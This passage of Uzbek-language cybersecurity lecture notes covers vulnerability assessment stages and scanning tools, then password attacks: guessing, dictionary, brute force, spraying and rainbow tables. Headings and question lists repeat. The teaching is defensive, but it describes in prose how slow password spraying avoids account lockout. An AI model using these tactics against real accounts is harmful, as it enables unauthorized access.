	•	Nmapning agressiv rejimi (-A) qaysi funksiyalarni bir vaqtning o‘zida ishga tushiradi?
	•	Nmap timing rejimlari (T0–T5) o‘rtasidagi asosiy farqlar nimada va ular qaysi holatlarda qo‘llaniladi?
Nazorat savollari
6.4. Zaifliklarni baholash  (Ma’ruza mashg‘uloti)
1. Zaifliklani baholash va uning muhimligi. 
2. Zaifliklani baholash jarayonining bosqichlari.
3. Zaifliklarni baholash usullari va vositalari.
Reja:
1. Zaifliklani baholash va uning muhimligi. 
2. Zaifliklani baholash jarayonining bosqichlari.
3. Zaifliklarni baholash usullari va vositalari.
Reja:

Zaifliklarni baholash (Vulnerability Assessment), Tarmoqqa asoslangan skanerlash (Network-based Scanning), Hostga asoslangan skanerlash (Host-based Scanning), Simsiz tarmoq skaneri (Wireless Network Scanning), Ilova skanerlari (Application Scans), Ma’lumotlar bazasi skanerlari (Database Scans), Zaifliklarni ustuvorlashtirish (Vulnerability Prioritization), Zaifliklarni boshqarish (Vulnerability Management).
Kalit so‘zlar:
Zaifliklarni baholash (Vulnerability Assessment), Tarmoqqa asoslangan skanerlash (Network-based Scanning), Hostga asoslangan skanerlash (Host-based Scanning), Simsiz tarmoq skaneri (Wireless Network Scanning), Ilova skanerlari (Application Scans), Ma’lumotlar bazasi skanerlari (Database Scans), Zaifliklarni ustuvorlashtirish (Vulnerability Prioritization), Zaifliklarni boshqarish (Vulnerability Management).
Kalit so‘zlar:
Zaifliklani baholash va uning muhimligi
Zaifliklarni baholash (Vulnerability Assessment) nima?
Zaifliklarni baholash – bu tarmoq infratuzilmasi, kompyuter tizimlari va ilovalardagi zaifliklarni aniqlash, tasniflash va ustuvorligini belgilash jarayonidir. Zaiflik – bu tashkilotni kiber tahdidlarga yoki xavflarga duchor qilishi mumkin bo‘lgan xavfsizlikdagi kamchilikdir. Zaifliklarni baholash jarayonida ko‘pincha avtomatlashtirilgan test vositalari, masalan, tarmoq xavfsizligi skanerlari qo‘llaniladi va natijalar maxsus zaifliklar bo‘yicha baholash hisobotida aks ettiriladi.
Doimiy kiberhujumlarga duch kelayotgan tashkilotlar muntazam zaifliklarni baholab borishdan katta foyda ko‘rishi mumkin. Tahdid subyektlari (hujumchilar) har doim mavjud zaifliklarni izlab, ular orqali ilovalar, tizimlar yoki butun tarmoqlardan foydalanishga harakat qilishadi. Dasturiy ta’minot va apparat vositalarida yangi zaifliklar doimiy ravishda aniqlanib boradi, tashkilotlar esa muntazam ravishda yangi komponentlarni joriy qiladi. Zaifliklarni baholash hamda zaifliklarni boshqarish dasturi bilan birgalikda zaif tomonlarni aniqlash, ularni bartaraf etish va xavfsizlik darajasini oshirishga yordam beradi.
Zaifliklarni baholashning ahamiyati
Eng ko‘p uchraydigan xavfsizlik zaifliklari odatda texnologik muammolar yoki foydalanuvchi xatti-harakatlaridan kelib chiqadi:
	•	ichki xodimlar tasodifan yoki ataylab ma’lumotlarni tashqi manbaga oshkor etishi mumkin;
	•	shifrlanmagan ma’lumot saqlangan yo‘qolgan yoki o‘g‘irlangan qurilmalar ham korporativ tarmoqdan foydalanishda katta xavf tug‘diradi;
	•	kiberjinoyatchilar ma’lumotlarni o‘g‘irlash yoki tizim ustidan nazoratni qo‘lga kiritish uchun nishon tizimlarga zararli dastur (malware) o‘rnatishlari mumkin.
Zaifliklarni boshqarish kompaniyalarga ma’lumotlar oshkor bo‘lishining oldini olishga yordam beradi, ammo bu jarayon doimiy kuzatuvni talab qiladi. Jarayon uzluksiz bo‘lib, davriy zaifliklarni baholashni o‘tkazishni talab qiladi, biri tugashi bilan boshqasi boshlanishi kerak.
Zaifliklarni baholash xavfsizlik guruhlariga operatsion tizimlar, biznes ilovalari, tugun qurilmalari (endpointlar) va brauzerlardagi xavfsizlik zaifliklarini aniqlash, tahlil qilish, tasniflash, hisobot berish va bartaraf etish imkonini beradi.
Tashkilotlar har yili minglab yangi zaifliklarni aniqlaydi, bu esa tarmoq, ilovalar va operatsion tizimlarni himoya qilish uchun doimiy yangilanish (patch) o‘rnatish va qayta konfiguratsiya qilishni talab qiladi. Ammo ko‘plab kompaniyalarda samarali yangilanish boshqaruvi strategiyasi bo‘lmaydi va zarur yangilanishlar o‘z vaqtida qo‘llanilmaydi.
Barcha zaifliklarni birdaniga yangilash amaliy jihatdan imkonsiz. Zaifliklarni boshqarish tizimi xavflilik darajasiga qarab ularni ustuvorlashtirishga yordam beradi va xavfsizlik jamoasi birinchi navbatda eng yuqori xavf tug‘diruvchi zaifliklarni bartaraf etishini ta’minlaydi. Zaifliklarni boshqarish – bu eng muhim zaifliklarni muntazam ravishda topish va bartaraf etish uchun zarur bo‘lgan vosita va jarayonlar majmuidir.
Zaifliklani baholash jarayonining bosqichlari
Amalda zaifliklarni boshqarish jarayoni quyidagi bosqichlarga bo‘lingan holda amalga oshiriladi.
1. Dastlabki tayyorgarlik (Initial Preparation)
Ushbu bosqichda jamoa zaifliklarni test qilishning doirasi (scope) va maqsadlarini belgilaydi. Bu quyidagilarni o‘z ichiga oladi:
	•	himoyalanadigan aktivlar va uskunalarni aniqlash hamda barcha chetki qurilmalarni (endpointlarni) xaritalash;
	•	har bir aktivning biznesdagi ahamiyatini va unga hujum qilinganda qanday ta’sir bo‘lishini aniqlash;
	•	har bir tizimning foydalanishni boshqarish mexanizmlari (access controls) va boshqa xavfsizlik talablarini aniqlash;
	•	tizimlarda muhim ma’lumot mavjud yoki mavjud emasligini, mavjud bo‘lsa, ushbu ma’lumot tizimlar orasida qanday uzatilishini aniqlash;
	•	himoyalanadigan aktivlardagi xizmatlar (services), jarayonlar (processes) va ochiq portlarning boshlang‘ich holatini qayd etish;
	•	aktivlarda o‘rnatilgan operatsion tizimlar va dasturiy ta’minotni aniqlash.
Ushbu ma’lumotlar xavfsizlik jamoasiga hujum sohasi (attack surface), eng xavfli tahdid ssenariylari va bartaraf etish strategiyasini shakllantirishga yordam beradi.
2. Zaifliklarni baholash testi (Vulnerability Assessment Testing)
Bu bosqichda jamoa nishon qurilmalar va muhitlarda avtomatlashtirilgan zaiflik skanerlari ishga tushiradi. Zarurat tug‘ilganda tizimning xavfsizlik holatini chuqur o‘rganish uchun qo‘lda ishlatiladigan vositalardan ham foydalaniladi.
Ushbu bosqichni avtomatlashtirish va samaradorligini oshirish uchun odatda quyidagilarga tayaniladi:
	•	zaifliklar bazalariga;
	•	dasturiy ta’minot ishlab chiqaruvchilarning xavfsizlik bo‘yicha e’lonlarga;
	•	tahdidlar bo‘yicha razvedka ma’lumotlariga (Threat Intelligence).
Bitta skanerlash jarayoni nishon tizim hajmi va skaner turiga qarab bir necha daqiqadan bir necha soatgacha davom etishi mumkin.
3. Zaifliklarni ustuvorlashtirish (Prioritize Vulnerabilities)
Bu bosqichda jamoa skanerlash natijalaridan noto‘g‘ri ijobiy (false positive) natijalarni chiqarib tashlaydi va zaifliklarni bir nechta omillar asosida ustuvorlashtiradi. Bunga quyidagilar kirishi mumkin:
	•	zaifliklar bazasi taqdim etgan xavflilik darajasi (severity score);
	•	zaiflik ekspluatatsiya qilinganda biznesga ta’siri;
	•	xavf ostidagi muhim ma’lumot;
	•	zaiflikni ekspluatatsiya qilish osonligi;
	•	zaiflik qancha vaqt davomida mavjud bo‘lgani;
	•	ushbu tizimdan boshqa muhim tizimlarga yonlama harakat (lateral movement) qilish imkoniyati;
	•	yangilanish mavjudligi va uni joriy etish uchun zarur harakat.
4. Zaifliklarni baholash hisobotini yaratish (Create a Vulnerability Assessment Report)
Bu bosqichda jamoa barcha himoyalangan aktivlarda aniqlangan zaifliklarni birlashtirgan yagona hisobot tayyorlaydi va ularni bartaraf etish rejasini kiritadi.
O‘rta va yuqori xavf darajasidagi zaifliklar uchun hisobot quyidagi ma’lumotlarni o‘z ichiga olishi kerak:
	•	zaiflik haqida batafsil izoh;
	•	u aniqlangan vaqt;
	•	qaysi tizimlarga ta’sir qilishi;
	•	hujumchilar undan foydalansa, qanday zarar yetishi mumkinligi;
	•	uni bartaraf etish rejasi va zarur resurslar.
Mumkin bo‘lgan hollarda har bir tanqidiy zaiflik qanday ekspluatatsiya qilinishi mumkinligini ko‘rsatuvchi tasdiq, PoC (Proof of Concept) ham taqdim etilishi lozim.
5. Uzluksiz zaifliklarni baholash (Continuous Vulnerability Assessment)
Zaifliklarni skanerlash tashkilotning raqamli infratuzilmasida mavjud bo‘lgan zaifliklarning faqat ayni paytdagi holatini ko‘rsatadi. Ammo, yangi tizimlar joriy etilishi, konfiguratsiya o‘zgarishlari, yangi zaifliklarning kashf etilishi, boshqa muammolar natijasida yangi zaifliklar paydo bo‘lishi mumkin. Shuning uchun zaifliklarni boshqarish jarayoni uzluksiz bo‘lishi kerak.
Dastur ishlab chiquvchi jamoalar avtomatlashtirilgan zaifliklarni baholash jarayonini CI/CD yondashuviga integratsiya qilishi lozim. Bu orqali zaifliklar iloji boricha dastlabki bosqichlarda, ya’ni dasturiy vositalarni yaratishning siklik davri (SDLC) davomida aniqlanadi va tuzatiladi. Bu esa keyinchalik zaif kodlar uchun yangilanish ishlab chiqish va tarqatish zaruratini kamaytiradi.
Biroq, bu jarayon barcha zaifliklarni aniqlay olmaydi – ko‘plab zaifliklar meros (legacy) yoki uchinchi tomon tizimlarida uchraydi. Shuning uchun ishlab chiqarish muhitlarini (production systems) muntazam skanerlash bilan to‘ldirilishi shart.
Zaifliklarni baholash usullari va vositalari
Zamonaviy zaifliklarni baholash jarayonlari avtomatlashtirilgan skanerlash vositalariga tayanadi. Quyida muhitni zaifliklar uchun skanerlashda qo‘llaniladigan asosiy vositalar toifalari keltirilgan:
Tarmoq asosidagi skanerlash (Network-based scanning)
Bu turdagi skanerlash tarmoq xavfsizligiga tahdid solishi mumkin bo‘lgan hujumlarni aniqlash uchun ishlatiladi. U simli (wired) yoki simsiz (wireless) tarmoqlarda zaif tizimlarni ham aniqlashi mumkin.
Hostga asoslangan skanerlash (Host-based scanning)
Bu usul serverlar, ishchi stansiyalar yoki boshqa tarmoq hostlaridagi zaifliklarni aniqlash uchun qo‘llaniladi.
Skanerlash jarayoni hostdagi ochiq portlar, xizmatlar va konfiguratsiya sozlamalarini tekshiradi, shuningdek, tizimning yangilanish tarixi haqida ma’lumot beradi.
Simsiz tarmoq skanerlari (Wireless network scans)
Bu skanerlar tashkilotning Wi-Fi tarmog‘ini zaifliklar bo‘yicha tekshiradi.
Ular zararli (malicious) foydalanish nuqtalarini (AP) aniqlashi va simsiz tarmoqlar xavfsiz tarzda sozlanganini tekshirishi mumkin.
Ilova skanerlari (Application scans)
Web-saytlar va mobil ilovalardagi mavjud dasturiy zaifliklar yoki noto‘g‘ri konfiguratsiyalarni aniqlash uchun ishlatiladi.
Ma’lumotlar bazasi skanerlari (Database scans)
SQL yoki NoSQL injeksiya kabi ma’lumotlar bazasiga xos hujumlarga imkon berishi mumkin bo‘lgan zaifliklarni aniqlashda qo‘llaniladi.
Shuningdek, ma’lumotlar bazasi serveridagi umumiy zaifliklar va noto‘g‘ri konfiguratsiyalarni ham aniqlaydi.
Zaifliklarni baholashda ishlatiladigan vositalar
Zaifliklarni aniqlashda ko‘plab vositalardan foydalanilib, ularning aksariyati (Nmap, OWASP ZAP, Burp Suite) bilan yuqorida tanishib o‘tildi. Quyida esa yana bir nechta keng qo‘llaniluvchi vositalar haqida qisqa ma’lumotlar keltiriladi.
Nessus – korporativ darajadagi eng kuchli zaiflik skanerlaridan biri bo‘lib, keng CVE ma’lumotlar bazasi, aniq tavsiyalar va kuchli hisobot moduli bilan ajralib turadi. “Credentialed scan” orqali tizim ichki konfiguratsiyalari, yangilanish darajasi, eskirgan xizmatlar yoki noto‘g‘ri ruxsatlar aniqlanadi. Nessus skan natijalarini CVSS ballari asosida ustuvorlashtiradi va tashkilotlar uchun amaliy “himoya mexanizmlarini” rejalari ishlab chiqishga yordam beradi.
OpenVAS/GVM – to‘liq ochiq manbali zaiflik skanerlash platformasi bo‘lib, tarmoqni kompleks baholash va avtomatlashtirilgan hisobotlar yaratish uchun qulay. GVM (Greenbone Vulnerability Manager) muntazam yangilanadigan zaifliklar bazasiga ega va Nessusga o‘xshash “Full & Fast” kabi siyosatlar bilan chuqur tahlil o‘tkazishi mumkin. Ochiq manbaliligi sababli ta’lim, kichik tashkilotlar va ichki laboratoriyalar uchun juda mos yechim hisoblanadi.
Nikto – web-server konfiguratsiyasi, xavfli fayllar, eskirgan versiyalar va umumiy zaifliklarni tezkor aniqlash uchun ishlatiladigan yengil ochiq manbali skaner. U kichik dastur bo‘lsada, serverdagi yuzlab oddiy va keng tarqalgan xatoliklarni juda tezlik bilan aniqlashga imkon beradi. Nikto dastlabki tahlil bosqichida ZAP yoki Burp bilan birgalikda qo‘llanganda juda foydali.
SQLmap – SQL Injection zaifliklarini aniqlash va ekspluatatsiya qilishni avtomatlashtiradigan kuchli vosita. U ma’lumotlar bazasining turini aniqlash, DB foydalanuvchi huquqlarini tekshirish, inyeksiya usullarini sinash va kerak bo‘lsa, ma’lumotlarni chiqarib olish imkonini beradi. SQLmap web-ilova xavfsizlik testlarida qo‘lda tekshiruvni sezilarli darajada yengillashtiradi.
Metasploit – eksploitlarni ishga tushirish, tasdiqlash (proof-of-concept, PoC) testlari o‘tkazish va zaiflikning haqiqiyligini tekshirish uchun mo‘ljallangan platforma. Skanerlardan olingan natijalar bilan birga qo‘llanganda, Metasploit topilgan zaiflikning real xavfini amalda tasdiqlashga yordam beradi. 
Exploit-DB – mavjud zaifliklar (CVE) uchun ochiq eksploitlar, PoC kodlar va xavfsizlik tadqiqotlarini jamlagan yirik ma’lumotlar bazasi. Zaifliklarni baholash jarayonida topilgan zaiflikni ekspluatatsiya qilish mumkinligini tekshirish uchun Exploit-DB asosiy manba bo‘lib xizmat qiladi. Bu resurs ko‘pincha Metasploit modullari bilan birgalikda qo‘llanadi.
	Zaifliklarni baholashning asosiy maqsadi nima va u tashkilotga qanday foyda keltiradi?
	•	Dastlabki tayyorgarlik bosqichida qaysi turdagi ma’lumotlar to‘planadi?
	•	Tarmoqqa asoslangan skanerlash bilan hostga asoslangan skanerlash orasidagi farq nimada?
	•	Simsiz tarmoq skanerlari tashkilot xavfsizligida qanday rol o‘ynaydi?
	•	Ilova skanerlari yordamida qaysi turdagi zaifliklarni aniqlash mumkin?
	•	Zaifliklarni ustuvorlashtirish jarayonida qaysi mezonlar hisobga olinadi?
	•	Nima uchun zaifliklarni baholash doimiy ravishda amalga oshirilishi kerak?
	•	Ma’lumotlar bazasi skanerlari qanday hujumlarga qarshi himoya qilishga yordam beradi?
Nazorat savollari
	•	Zaifliklarni baholashning asosiy maqsadi nima va u tashkilotga qanday foyda keltiradi?
	•	Dastlabki tayyorgarlik bosqichida qaysi turdagi ma’lumotlar to‘planadi?
	•	Tarmoqqa asoslangan skanerlash bilan hostga asoslangan skanerlash orasidagi farq nimada?
	•	Simsiz tarmoq skanerlari tashkilot xavfsizligida qanday rol o‘ynaydi?
	•	Ilova skanerlari yordamida qaysi turdagi zaifliklarni aniqlash mumkin?
	•	Zaifliklarni ustuvorlashtirish jarayonida qaysi mezonlar hisobga olinadi?
	•	Nima uchun zaifliklarni baholash doimiy ravishda amalga oshirilishi kerak?
	•	Ma’lumotlar bazasi skanerlari qanday hujumlarga qarshi himoya qilishga yordam beradi?
Nazorat savollari
6.5. Parolga qaratilgan hujumlar  (Ma’ruza mashg‘uloti)
1. Parolga  qaratilgan hujumlar: 
 a. Lug‘atga asoslangan hujum;
 b. Qo‘pol kuch hujumi;
 c. Rainbow jadvaliga asoslangan hujum.
Reja:
1. Parolga  qaratilgan hujumlar: 
 a. Lug‘atga asoslangan hujum;
 b. Qo‘pol kuch hujumi;
 c. Rainbow jadvaliga asoslangan hujum.
Reja:

Faraz qilish (guessing), lug‘atga asoslangan (dictionary) va brute force hujumlari, rainbow jadvali, parol buzuvchi dasturlar, John the Ripper.
Kalit so‘zlar:
Faraz qilish (guessing), lug‘atga asoslangan (dictionary) va brute force hujumlari, rainbow jadvali, parol buzuvchi dasturlar, John the Ripper.
Kalit so‘zlar:
Parolni buzish (password cracking yoki password hacking) – bu ruxsatsiz autentifikatsiya qilish uchun xakerlar parolni aniqlash yoki buzishga urinishlari bilan bog‘liq hujum turi hisoblanadi. Parolni buzishda dasturiy vositalar, qo‘lda bajariladigan qadamlar hamda maxsus vositalar yordamida avtomatlashtirilgan usullar qo‘llanadi. Ushbu parolni buzish vositalari “parol buzuvchilar” (password crackers) deb nomlanadi. So‘nggi yillarda bunday vositalar sun’iy intellektdan foydalanib, parol buzish tezligi va samaradorligini oshirmoqda. Shuningdek, parollar boshqa usullar orqali ham o‘g‘irlanishi mumkin, masalan: xotirani skanerlovchi zararli dasturlar, shoulder surfing (foydalanuvchi parol terayotganini kuzatish), uchinchi tomon ma’lumotlarining buzilishi yoki Redline kabi maxsus parol o‘g‘irlaydigan vositalar orqali.
Parol – bu ruxsat etilgan foydalanuvchini resursga autentifikatsiya qilish uchun ishlatiladigan ixtiyoriy belgilar ketma-ketligi yoki maxfiy ma’lumotdir. Odatda parol foydalanuvchi nomi yoki shaxsni tasdiqlovchi boshqa mexanizmlar bilan birga qo‘llanadi. Ushbu kombinatsiya “qayd yozuvi yoki akkaunt ma’lumotlari” (credentials) deb ataladi.
Parolga qaratilgan hujumlar
Yaroqli akkaunt ma’lumotlari (foydalanuvchi nomi va parol) oddiy foydalanuvchiga biror resursdan foydalanish imkonini beradi. Agar tahdid soluvchi shaxs (threat actor) foydalanuvchi nomini bilsa, u holda ushbu akkauntning parolini qo‘lga kiritish xakerlik vazifasiga aylanadi.
Ko‘pincha tahdid soluvchilar birinchi bo‘lib tizim administratorlarini nishonga oladilar, chunki ularning akkaunt ma’lumotlari bevosita muhim ma’lumotlar va tizimlardan foydalanish imtiyozlariga ega bo‘lishi mumkin. Bunday imtiyozli akkaunt ma’lumotlari kiberjinoyatchiga tarmoq bo‘ylab ko‘rinmasdan yoki deyarli shubha uyg‘otmasdan harakatlanish, hatto boshqa akkauntlarni buzib, tizimdan doimiy foydalanishni saqlab qolish imkonini beradi. Tahdid soluvchi kimningdir akkaunt ma’lumotlarini qo‘lga kiritganidan so‘ng, ushbu akkauntga tegishli barcha resurslar endi xaker uchun ochiq o‘ljaga aylanadi.
Eng muhim akkauntlar (domen administratorlari, ma’lumotlar bazasi administratorlari va boshqalar) ma’lumotlarining buzilishi ayrim kompaniyalar uchun “o‘yin tugadi” holatini keltirib chiqarishi mumkin. Bunday akkauntlar va ularning ma’lumotlari imtiyozni oshirish (privilege escalation) hujumlari uchun eng asosiy hujum turi hisoblanadi.
Hujumchilarning ustunligi
Hujumchilar odatda himoyachilarga nisbatan kamida ikki ustunlikka ega bo‘ladi:
Vaqt ustunligi – ular ko‘pincha keng qamrovli, tarqoq (scatter-gun) yondashuvdan foydalanib, tizimga kirishga urinadilar. Bu esa barcha xavfsizlik signalini bir vaqtning o‘zida qo‘zg‘atuvchi to‘liq hujumga qaraganda sezilmas bo‘ladi.
Avtomatlashtirilgan parol buzish vositalari – bunday vositalar tobora ko‘proq mashina o‘rganish (M/L) va sun’iy intellekt (AI) bilan kuchaytirilib, aniqlanishdan qochish texnikalaridan foydalangan holda hujumni mustaqil bajaradi.
Parol buzuvchilar individual akkauntlarda bloklanishni ishga tushirmaslik uchun parollarni juda sekin, bosqichma-bosqich sinab ko‘rishi mumkin. Masalan, agar dastur har bir akkaunt bo‘yicha har 10 daqiqada atigi bitta parolni sinab ko‘rsa, 100 000 ta parolni tekshirish juda uzoq vaqt oladi. Shuning uchun kiberhujumchi har bir parolni bilgan barcha akkauntlarga tartibsiz yoki tasodifiy ketma-ketlikda sinab chiqadi (spray attack). Bu usul samarali bo‘lib, bu aksariyat tizimlar parol urinishlarini akkauntlar bo‘yicha umumiy hisoblamasligiga asoslanadi. Hatto SIEM yoki UEBA faol bo‘lganda ham himoya choralarining o‘zi cheklangan: siz barcha akkauntlarni bloklay olmaysiz. IP manzilni bloklash esa hujumning boshqa IP orqali davom etishiga olib keladi, ko‘pincha yuzlab yoki minglab IPlar orqali tarqatilgan bo‘ladi.
Bunday hujumga qarshi eng yaxshi himoya – barcha foydalanadigan parollar ro‘yxatidagi parollardan umuman foydalanmaslik. Parolni tez-tez almashtirish odatda dangasalikni keltirib chiqaradi: “password” → “p@ssw0rd” → “Password!”. Barcha parol buzuvchilar bundan xabardor. Harflarni raqam yoki belgilar bilan almashtirish ham oldindan taxmin qilinadigan usul. Masalan: E → 3, A → 4, a → @. Parol buzish vositalari bu kabi keng tarqalgan o‘zgarishlar uchun oldindan tayyorlangan.
Hujumchilar, shuningdek, parol murakkabligiga oid asosiy ma’lumotlarni bilishga intiladilar: parolning minimal va maksimal uzunligi, unda katta-kichik harflar, raqamlar, belgilar mavjudligi yoki ularning kombinatsiyasi. Shuningdek, parollarga qo‘yilgan cheklovlar ham qiziqtiradi. Masalan:
	•	katta harf ishlatish majburiyati;
	•	parol raqam yoki belgi bilan boshlanmasligi;
	•	muayyan turdagi belgilar minimal soni;
	•	belgilarning takrorlanishini cheklash.
Bunday parol yaratish qoidalari hujumchi ko‘rib chiqishi kerak bo‘lgan kombinatsiyalar sonini kamaytiradi va aslida parolning himoya darajasini pasaytiradi. Parol buzish vositalarida aynan shu cheklovlarni kiritish orqali hujumni tezlashtirish imkoniyati mavjud.
Individual foydalanuvchilar va shaxsiy akkauntlar uchun bunday hujum muvaffaqiyatli bo‘lish ehtimoli juda past. Yakka akkauntga qaratilgan hujum odatda bloklanishni ishga tushiradi. Past tezlikdagi parolni barcha variantlarini ko‘rib chiqish (brute-force) hujumi esa hatto qisqa parollarni topish uchun ham deyarli cheksiz vaqt talab qiladi.
Parol buzish vositalari bir nechta akkauntlarga avtomatlashtirilgan holda parol taxmin qilish uchun juda qulay, lekin ular katta hajmdagi ma’lumot ichidan umumiy shablonlar, iboralar va ma’lumotlarni izlab topishda ham nihoyatda samarali.
Quyida parollarni aniqlashda ishlatiladigan keng tarqalgan usullar haqida ma’lumtlar keltiriladi.
Tasodifiy faraz qilish hujumi
Foydalanuvchi nomlari (usernames) – bu akkaunt ma’lumotlarining o‘zgarmaydigan qismi bo‘lib, juda oson bashorat qilinadi. Ular ko‘pincha ismning bosh harfi + familiya shaklida bo‘ladi. Ko‘p hollarda foydalanuvchi nomi elektron pochta manzilidir, bu esa keng tarqalgan va ko‘pchilikka ma’lum. Demak, hujumchi sizning tizimlaringizga kirish uchun kerak bo‘lgan ma’lumotlarning yarmiga allaqachon ega. Endi yetishmayotgani faqat parol.
Tasodifiy parol farazi agar u keng tarqalgan parol yoki lug‘atdagi so‘z asosida bo‘lmasa odatda muvaffaqiyatli bo‘lmaydi. Nomaqbul parol tanlash ehtimoli, tahdid soluvchi nishon foydalanuvchining shaxsiga oid ma’lumotlarga ega bo‘lsa, ancha yuqori bo‘ladi. Bunday ma’lumotlar ijtimoiy tarmoqlar, bevosita muloqot, aldov orqali olib borilgan suhbat yoki avvalgi ma’lumotlar buzilishi natijasida yig‘ilgan bo‘lishi mumkin.
Parolni faraz qilishga eng ko‘p moyil bo‘lgan variantlar quyidagi umumiy sxemalarga asoslanadi:
	•	“password” so‘zi yoki uning asosiy o‘zgarishlari, masalan: “p@ssw0rd”;
	•	foydalanuvchi nomidan olingan hosilalar, jumladan bosh harflar. Bunda kichik o‘zgarishlar, masalan raqamlar yoki maxsus belgilar qo‘shilishi mumkin;
	•	foydalanuvchi yoki uning qarindoshlarining tug‘ilgan sanalarining turli formatlari; eng ko‘p ishlatiladigani – farzandlar yoki muhim sanalar;
	•	eslab qolishga oson joylar yoki voqealar;
	•	qarindoshlar ismlari va ularning raqam yoki maxsus belgilar bilan kombinatsiyalari;
	•	uy hayvonlari nomlari, ranglar, taomlar yoki shaxs uchun muhim boshqa elementlar.
Avtomatlashtirilgan parol buzish vositalari bunday faraziy hujumlar uchun shart emas, ammo ular muvaffaqiyat ehtimolini sezilarli oshiradi.
Parolni faraz qilish hujumlari odatda tizim hodisalar jurnallarida iz qoldiradi va ma’lum miqdordagi (“n”) noto‘g‘ri urinishlardan so‘ng akkauntning avtomatik bloklanishiga olib keladi. Agar foydalanuvchilar bir xil parolni bir nechta resurslarda ishlatsalar (parol gigiyenasi yomon bo‘lsa), parolni faraz qilish hamda bildirmasdan harakatlanish xavfi keskin ortadi.
Lug‘atga asoslangan hujum
Lug‘atga asoslangan hujumlar (Dictionary attacks) – bu avtomatlashtirilgan usul bo‘lib, yaroqli akkauntga qarshi parollar ro‘yxati qo‘llanadi va bu orqali haqiqiy parol aniqlanadi. Ushbu ro‘yxatning o‘zi lug‘at (dictionary) so‘zlar to‘plamidir. Oddiy parol buzuvchi vositalar “baseball” kabi keng tarqalgan oddiy so‘zlar ro‘yxatidan foydalanib, parolni buzadi, akkauntni egallaydi va tahdid soluvchining zararli faoliyatini boshlaydi.
Agar tahdid soluvchi nishon qilingan akkauntning parol uzunligi va murakkablik talablari haqida ma’lumotga ega bo‘lsa, lug‘at aynan shu talablarga moslab moslashtiriladi. Kengaytirilgan (advanced) parol buzuvchilar odatda lug‘atga raqamlar va maxsus belgilarni qo‘shib, murakkab parol talablari mavjud bo‘lgan real parolni taqlid qiladi.
Samarali lug‘at hujumi vositasi tahdid soluvchiga quyidagi imkoniyatlarni beradi:
	•	parol uzunligi, belgi talablari va belgi to‘plamlari bo‘yicha murakkablik talablarini sozlash;
	•	nishonga moslab maxsus so‘zlar yoki so‘z birikmalarini qo‘lda qo‘shish;
	•	keng qo‘llanadigan so‘zlarning noto‘g‘ri yozilish variantlarini, shuningdek simvollar bilan almashtirilgan yoki to‘ldirilgan shakllarini sinab ko‘rish;
	•	bir nechta tillarda ishlash.
Lug‘atga asoslangan hujumlarining asosiy zaifligi shundaki, ular foydalanuvchi tomonidan kiritilgan haqiqiy so‘zlar yoki ularning hosilalariga tayanadi. Agar haqiqiy parol to‘qima bo‘lsa, bir nechta tildan iborat bo‘lsa yoki ikki va undan ortiq so‘zlardan tashkil topgan bo‘lsa, lug‘at hujumiga qarshi samarali bo‘ladi.
Lug‘at hujumi xavfini kamaytirishning eng keng tarqalgan chorasi — akkauntni bloklash mexanizmi. Ma’lum miqdordagi (“n”) noto‘g‘ri urinishlardan so‘ng foydalanuvchi akkaunti avtomatik tarzda vaqtincha bloklanadi va bir necha marta bloklanganidan keyin inson aralashuvini talab qiladi. Akkauntni administrator yoki avtomatlashtirilgan parolni tiklash tizimi qo‘l bilan tiklashi kerak.
Biroq, ba’zan bloklash funksiyasi o‘chirib qo‘yilgan bo‘ladi. Agar tizim hodisalar jurnalida kirish muvaffaqiyatsizliklari kuzatilmasa, lug‘at hujumi tahdid soluvchi uchun juda samarali hujum turi bo‘lib qoladi.
Qo‘pol kuch hujumi
Qo‘pol kuch yoki barcha variantlarni sinab ko‘rish (brute force) parol hujumlari parolning barcha mumkin bo‘lgan kombinatsiyalarini ketma-ket sinab ko‘rishga asoslangan dasturiy usuldan foydalanadi. Bu usul belgilar soni qisqa bo‘lgan va murakkabligi past parollar uchun samarali hisoblanadi. Ammo, zamonaviy eng tezkor tizimlar uchun ham 8 ta belgidan iborat yoki undan uzun bo‘lgan parollarni buzish deyarli imkonsiz holga keladi.
Agar parol faqat alifbodagi harflardan (katta va kichik harflar) iborat bo‘lsa, uni buzish uchun taxminan 8 031 810 176 ta urinish kerak bo‘ladi. Bu tahdid soluvchi parol uzunligi va murakkablik talablari haqida aniq ma’lumotga ega deb hisoblangan holatdir. Bundan tashqari, raqamlar, katta-kichik harf ishtiroki, mahalliy tilga xos maxsus belgilar kabi omillar ham kombinatsiyalar sonini yanada oshiradi.
To‘g‘ri parametrlar kiritilgan bo‘lsa, qo‘pol kuch hujumi oxir-oqibat parolni albatta topadi. Biroq talab etiladigan hisoblash quvvati va vaqt shunchalik katta bo‘lishi mumkinki, hujum tugaguncha parolning amaliy qiymati qolmaydi. Hujumning davom etish vaqti barcha mumkin bo‘lgan kombinatsiyalarni yaratish tezligi va so‘ngra nishon tizimining javob berish tezligiga bog‘liq bo‘ladi (serial yoki multithreaded so‘rovlar orqali).
Qo‘pol kuch hujumlari parolni buzishning eng samarasiz usuli hisoblanadi. Shu sababli tahdid soluvchilar uni odatda so‘nggi chorada, boshqa barcha usullar samara bermagandan keyin qo‘llaydilar.
Rainbow jadvaliga asoslangan hujum
Hujumchi biror tizim yoki web-saytga kirishga muvaffaq bo‘lsa, u ko‘pincha ilovaga kiruvchi barcha foydalanuvchilarning foydalanuvchi nomlari va parollari saqlangan ma’lumotlar bazasini o‘g‘irlashga intiladi. Parollar odatda inson o‘qiy oladigan ko‘rinishda bo‘lmaydi – ular xeshlangan holda saqlanadi. Parol bazasini o‘g‘irlash parol o‘g‘irlash bo‘yicha kamida uchta katta afzallik beradi:
	•	tizimda yoki boshqa resurslarda mashina-mashina aloqalari uchun ishlatilishi mumkin bo‘lgan yuqori imtiyozli foydalanuvchi akkaunt ma’lumotlarini aniqlash;
	•	bir nechta tizimlarda autentifikatsiya va avtorizatsiya uchun qayta ishlatilishi ehtimoli yuqori bo‘lgan juda boy akkauntlar to‘plamini aniqlash;
	•	hujumni oflayn tarzda, tizimning kirish urinishlari soni yoki chastotasiga qo‘ygan cheklovlaridan qatiy nazar amalga oshirish imkoniyati.
